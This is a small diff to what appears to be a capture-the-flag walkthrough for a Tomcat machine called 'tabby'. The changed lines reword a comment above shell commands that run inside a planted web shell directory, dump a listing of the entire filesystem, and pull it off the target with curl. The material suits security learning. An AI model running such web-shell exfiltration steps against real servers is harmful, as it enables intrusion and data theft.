@@ -236,7 +236,8 @@ pwd # /var/lib/tomcat9/webapps
 ls -alp # finally we can properly browse around!
 ls -alp webapps
 
-# let's exfiltrate some data we have generated ourselves:
+# we have gained a new ability:
+# let's exfiltrate some data that we have generated ourselves:
 cd webapps/shell
 find / > filesystem 2>&1
 curl tabby:8080/shell/filesystem > filesystem
